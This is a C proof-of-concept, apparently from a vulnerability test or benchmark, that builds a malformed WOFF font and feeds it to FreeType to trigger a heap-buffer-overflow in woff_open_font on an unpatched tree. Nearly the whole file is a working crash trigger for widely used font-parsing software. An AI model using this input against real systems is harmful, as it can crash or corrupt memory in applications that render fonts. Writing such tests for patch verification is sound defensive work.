/*
 * Residual PoC for the WOFF excessive-SFNT-size handling in
 * src/sfnt/sfwoff.c (woff_open_font).
 *
 * Builds a minimal, structurally valid single-table WOFF whose declared
 * uncompressed SFNT size is just above the shipped allocation bound, then
 * feeds it to the public API FT_New_Memory_Face().  On the shipped tree the
 * SFNT buffer is clamped to 0x4000000 bytes while the table is laid out and
 * copied according to totalSfntSize, so the uncompressed-table memcpy writes
 * past the heap allocation (AddressSanitizer: heap-buffer-overflow).
 *
 * On the golden tree the same font is rejected (totalSfntSize exceeds the
 * accepted maximum) before any allocation, so nothing is copied.
 */

#include <ft2build.h>
#include FT_FREETYPE_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>


static void
put32( unsigned char*  p,
       unsigned long    v )
{
  p[0] = (unsigned char)( ( v >> 24 ) & 0xFF );
  p[1] = (unsigned char)( ( v >> 16 ) & 0xFF );
  p[2] = (unsigned char)( ( v >>  8 ) & 0xFF );
  p[3] = (unsigned char)( ( v >>  0 ) & 0xFF );
}


static void
put16( unsigned char*  p,
       unsigned int     v )
{
  p[0] = (unsigned char)( ( v >> 8 ) & 0xFF );
  p[1] = (unsigned char)( ( v >> 0 ) & 0xFF );
}


int
main( void )
{
  const unsigned long  orig_len = 0x4000024UL;   /* ~64 MiB, uncompressed  */
  const unsigned long  total    = 0x4000040UL;   /* 12 + 16 + roundup(orig) */
  const unsigned long  length   = 64UL + orig_len; /* header+dir+table data */

  unsigned char*  buf;
  unsigned char*  p;

  FT_Library  library;
  FT_Face     face;
  FT_Error    error;


  buf = (unsigned char*)calloc( 1, length );
  if ( !buf )
  {
    fprintf( stderr, "alloc failed\n" );
    return 2;
  }

  /* WOFF header (44 bytes). */
  put32( buf +  0, 0x774F4646UL );  /* signature  'wOFF'            */
  put32( buf +  4, 0x00010000UL );  /* flavor     sfnt 1.0          */
  put32( buf +  8, length       );  /* length                      */
  put16( buf + 12, 1            );  /* num_tables                  */
  put16( buf + 14, 0            );  /* reserved                    */
  put32( buf + 16, total        );  /* totalSfntSize               */
  put16( buf + 20, 0            );  /* majorVersion                */
  put16( buf + 22, 1            );  /* minorVersion                */
  put32( buf + 24, 0            );  /* metaOffset                  */
  put32( buf + 28, 0            );  /* metaLength                  */
  put32( buf + 32, 0            );  /* metaOrigLength              */
  put32( buf + 36, 0            );  /* privOffset                  */
  put32( buf + 40, 0            );  /* privLength                  */

  /* Single table directory entry (20 bytes) at offset 44. */
  p = buf + 44;
  put32( p +  0, 0x676C7966UL );    /* tag        'glyf'           */
  put32( p +  4, 64           );    /* offset                      */
  put32( p +  8, orig_len     );    /* compLength (== origLength)  */
  put32( p + 12, orig_len     );    /* origLength  -> uncompressed */
  put32( p + 16, 0            );    /* checksum                    */

  /* Table payload (zeros from calloc) lives at offset 64. */

  error = FT_Init_FreeType( &library );
  if ( error )
  {
    fprintf( stderr, "FT_Init_FreeType: 0x%02x\n", (unsigned)error );
    free( buf );
    return 2;
  }

  error = FT_New_Memory_Face( library, buf, (FT_Long)length, 0, &face );
  fprintf( stderr, "FT_New_Memory_Face returned 0x%02x\n", (unsigned)error );

  if ( !error )
    FT_Done_Face( face );
  FT_Done_FreeType( library );
  free( buf );

  return 0;
}
